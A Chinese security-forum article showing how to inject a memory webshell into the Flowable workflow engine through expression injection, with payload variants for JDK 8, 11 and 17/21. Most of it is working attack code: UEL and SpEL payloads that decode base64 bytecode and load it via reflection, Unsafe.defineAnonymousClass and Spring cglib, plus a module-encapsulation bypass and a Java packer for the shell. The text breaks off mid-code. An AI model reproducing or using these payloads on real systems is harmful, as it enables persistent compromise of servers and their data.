---
title: flowable流程引擎JDK 8-21 全版本内存马注入
url: https://forum.butian.net/share/4528
source: 奇安信攻防社区
date: 2025-09-03
fetch_date: 2025-10-02T19:32:24.532099
---

# flowable流程引擎JDK 8-21 全版本内存马注入

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### flowable流程引擎JDK 8-21 全版本内存马注入

* [漏洞分析](https://forum.butian.net/topic/48)

Flowable 是一个用 Java 编写的轻量级业务流程引擎。其中存在插入表达式的功能，其表达式为UEL表达式，并且在达到触发条件时，会对该表达式进行解析执行。

前置基础
----
Flowable 是一个用 Java 编写的轻量级业务流程引擎。其中存在插入表达式的功能，其表达式为UEL表达式，并且在达到触发条件时，会对该表达式进行解析执行。更深入的理解：<https://forum.butian.net/share/3823>。
漏洞利用
----
目前关于flowable漏洞利用的技术分析文章已有较多公开资料，但针对内存马注入技术的研究相对匮乏。芋道管理系统集成了Flowable工作流引擎，其最新版本已全面支持Java 17/21运行环境。本以芋道测试环境，深入探究了在不同Java版本（8/11/17/21）下实现flowable内存马注入。
相关漏洞利用：
<https://xz.aliyun.com/news/13969>
JDK8
----
在JDK8中，直接使用当前线程的contextClassLoader去反射调用defineClass方法来进行恶意类的加载即可
```bash
''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var base64Str = "yv66vg...";var clsString = java.lang.Class.forName("java.lang.String");var bytecode;try { var decoder = java.lang.Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null); bytecode = decoder.getClass().getMethod("decode", clsString).invoke(decoder, base64Str);} catch (ee) { var decoder = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance(); bytecode = decoder.getClass().getMethod("decodeBuffer", clsString).invoke(decoder, base64Str);}var clsByteArray = (new java.lang.String("a").getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));clazz.newInstance();')
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-29b82bfddaf1da274d2e1ad4efd75840929ffc65.png)
新建流程，在监听器插入表达式即可
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-abee89ed1524db67c023660d06d607fc2f9c58c1.png)
执行流程就会触发
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-aa9a5e97bfc44c90ef2aae9f0569ef42b6e8df0d.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-238e46b3310e6b9e27245d52e42c4d208a2afccf.png)
JDK11
-----
修改jdk版本为11，继续使用该poc
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-5e2b43e18eef28586dd5994a3c094902744bc2c6.png)
此时报错了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-31d6b9142d1b91c5ff7c32a55c82ac211adf07e9.png)
控制台日志可以发现报错：`Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte\[\],int,int) throws java.lang.ClassFormatError accessible: module java.base does not "opens java.lang" to module jdk.scripting.nashorn.scripts `
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-fb6943dadc2ee6d20b475ddc73a79f32ccae3dcf.png)
这块有点疑问，根据网上大多数公开文章都说的是JDK17版本之后使用了强封装直接会ban掉非法反射，但在jdk11中只会提示在未来的版本会完全禁用掉此类的不安全反射操作，但是不影响字节码的加载
先不深究，这块使用Unsafe类defineAnonymousClass​方法进行类加载即可。但需要注意的一个槽点就是：JDK&gt;8时（JDK8及以下无此限制），defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：
1. 没有包名
2. 包名跟第一个参数Class的包名一致(在同一包下)，否则会报错
```bash
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var ClassBytes = java.util.Base64.getDecoder().decode('yv66vg...');var safeClass = java.lang.Class.forName('sun.misc.Unsafe');var safeCon = safeClass.getDeclaredField('theUnsafe');safeCon.setAccessible(true);var unSafe = safeCon.get(null);var mem = unSafe.defineAnonymousClass(org.flowable.engine.impl.test.NoOpServiceTask.class, ClassBytes, null);mem.newInstance();")}
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-ae62b59e3b175e40acd3b9d4f9c9d7d7214f205c.png)
成功
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-5371a65aad35564d3c67f36373e80fb7c94efdec.png)
JDK17/21
--------
Nashorn 引擎jdk17被移除了，Graal.js 的依赖又默认注释。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-0b5a453abee0c68a1893f2f8db6de6578cb96177.png)
这块我们想到用spel表达式来注入内存马，通过org.springframework.cglib.core.ReflectUtils​进行类加载，具体分析可以参考[CVE-2024-36401 JDK 11-22 通杀内存马](https://mp.weixin.qq.com/s/jCOp9A-qO8ViqLx3ui0XHg)
poc
```bash
${''.getClass().forName("org.springframework.expression.spel.standard.SpelExpressionParser").newInstance().parseExpression("T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(java.util.Base64).getDecoder().decode('gzip + Base64')))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))").getValue()}
```
需要注意的点就是注入器类名需要在org.springframework.expression​下，并且注入的内存马需要绕过高版本反射的限制（HelpUtils替换为自己类名）
```bash
Class unsafeClass = Class.forName("sun.misc.Unsafe");
Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
unsafeField.setAccessible(true);
Unsafe unsafe = (Unsafe) unsafeField.get(null);
Module module = Object.class.getModule();
Class cls = HelpUtils.class;
long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.getAndSetObject(cls, offset, module);
```
这块使用MemShellParty生成的马是处理过的，无需修改
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/08/attach-90df906fa8ccffd61033527d9aab09f1d1106165.png)
修改重新打包内存马绕过SpEL​字符限制
```bash
package com.example.demo;
import java.io.\*;
import java.util.Base64;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPOutputStream;
public class Evil {
public static void main(String[] args) {
// 内存马代码文件
String javaFilePath = "/Users/yu9/Desktop/demo/src/main/java/com/example/demo/Test.java";
String javacPath = "/Users/yu9/Library/Java/JavaVirtualMachines/ms-17.0.15/Contents/Home/bin/javac";
String classFilePath = "/Users/yu9/Desktop/demo/src/main/java/com/example/demo/Test.class";
// 输出'gzip + Base64'的恶意字节码到文件
String outputFilePath = "SpELMemShell.txt";
try {
// 编译 .java 文件
compileJavaFile(javaFilePath,javacPath);
// 检查 .class 文件是否已生成
if (!new File(classFilePath).exists()) {
throw new FileNotFoundException("The compiled class file was not generated.");
}
// 压缩并编码 .class 文件
String base64String = compressAndEncodeClassFile(classFilePath);
// 写入文件
writeToFile(outputFilePath, base64String);
} catch (IOException e) {
System.err.println("Error processing the file: " + e.getMessage());
}
}
private static void compileJavaFile(String javaFilePath,String javacPath) throws IOException {
// 内存马中的Object.class.getModule()方法是在Java 9及更高版本中引入的，因此需要指定使用Java 9+的javac进行编译
List<String> command = new ArrayList<>();
command.add(javacPath); // 使用 javac 的完整路径
command.add("-g:none");
command.add("-Xlint:unchecked");
command.add("-Xlint:deprecation");
command.add(javaFilePath);
ProcessBuilder processBuilder = new ProcessBuilder(command);
Process process = processBuilder.start();
// 等待编译完成
try {
int exitCode = process.waitFor();
if (exitCode != 0) {
BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
String line;
while ((line = errorReader.readLine()) != null) {
System.err.println(line);
}
throw new RuntimeException("Compilation failed with exit code " + exitCode);
}
} catch (InterruptedException e) {
Thread.currentThread().interr...